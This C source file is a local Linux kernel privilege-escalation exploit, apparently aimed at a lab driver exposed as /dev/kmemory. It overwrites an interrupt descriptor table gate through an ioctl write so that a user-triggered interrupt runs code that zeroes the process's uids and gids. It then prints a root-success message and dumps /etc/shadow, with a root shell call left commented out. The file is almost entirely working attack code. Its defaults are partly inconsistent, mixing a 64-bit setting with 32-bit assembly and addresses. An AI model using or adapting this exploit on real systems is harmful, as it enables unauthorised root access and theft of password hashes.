#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/utsname.h>

#include "kmem_ioctl.h"

#define UBUNTU14_32 1
#define UBUNTU14_64 2

#ifndef SYSTEM
# define SYSTEM UBUNTU14_64
#endif

#if SYSTEM == UBUNTU14_32
# define START_ADDR 0xC0000000
#elif SYSTEM == UBUNTU14_64
# define START_ADDR 0xffff880000000000
#endif


static int THREAD_SIZE_MASK = (-4096);

static uid_t uid = 0;

struct idtr {
	unsigned short limit;
	unsigned int base;
} __attribute__ ((packed));

struct idt {
	unsigned short off1;
	unsigned short sel;
	unsigned char none,flags;
	unsigned short off2;
} __attribute__ ((packed));

#define SET_IDT_GATE(idt,ring,s,addr)    \
	(idt).off1 = addr & 0xffff;      \
	(idt).off2 = addr >> 16;         \
	(idt).sel = s;                   \
	(idt).none = 0;                  \
	(idt).flags = 0x8E | (ring << 5); 

void kernel(unsigned *task)
{
	unsigned *addr = task;

	while (addr[0] != uid ||
               addr[1] != uid ||
	       addr[2] != uid ||
               addr[3] != uid)
		addr++;

        addr[0] = addr[1] = addr[2] = addr[3] = 0; /* set uids */
        addr[4] = addr[5] = addr[6] = addr[7] = 0; /* set gids */
}

void kcode(void);
void __kcode(void)
{
	asm(
	"kcode: \n"
	"cld \n"
	"pusha \n"
	"pushl %es \n"
	"pushl %ds \n"
	"movl %ss,%edx \n"
	"movl %edx,%es \n"
	"movl %edx,%ds \n");
	__asm__("movl %0 ,%%eax" ::"m"(THREAD_SIZE_MASK));
	asm(
	"andl %esp,%eax \n"
	"pushl (%eax) \n"
	"call kernel \n"
	"addl $4, %esp \n"
	"popl %ds \n"
	"popl %es \n"
	"popa \n"
	"cli \n"
	"iret \n"
	);
}

static void fatal(char *msg)
{
        fprintf(stderr, "%s\n", msg);
        exit(1);
}

int cat(const char *fname)
{
	char buffer[4096];
	ssize_t nbytes;
	int ifd = open(fname, O_RDONLY);

	if (ifd < 0) {
		fprintf(stderr, "Can't open file %s\n", fname);
		perror("Error: ");
		return -1;
	}

	while ((nbytes = read(ifd, buffer, sizeof(buffer))) > 0) {
		if (write(1, buffer, nbytes) != nbytes)
			return -2;
	}

	return (nbytes < 0) ? -2 : 0;
}

int main(int argc, char *argv[])
{
	int fd, rc;
	struct idt *idt = (struct idt *) 0xc1c7b000;

	uid = getuid();

	fd = open("/dev/kmemory", O_RDONLY);
	if (fd < 0) {
		printf("Can't open /dev/kmemory\n");
		exit(1);
	}
	printf("open: fd %d\n", fd);

        struct idt idtvec;
	struct kmem_ioctl mem = {
                .rw = {
                        .buf   = &idtvec,
                        .ppos  = &idt[0xdd],
                        .count = sizeof(struct idt)
                }
        };
	SET_IDT_GATE(idtvec, 3, 0x60, ((unsigned long) &kcode));
	rc = ioctl(fd, KMEM_IOCTL_WRITE, &mem);

	asm ("int $0xdd");

        if (getuid() == 0) {
                printf("[+] Got root!\n");
        } else {
                fatal("[x] Failed to get root :(");
        }

        setresuid(0, 0, 0);
	cat("/etc/shadow");
        //execl("/bin/sh", "/bin/sh", "−i", NULL);
}
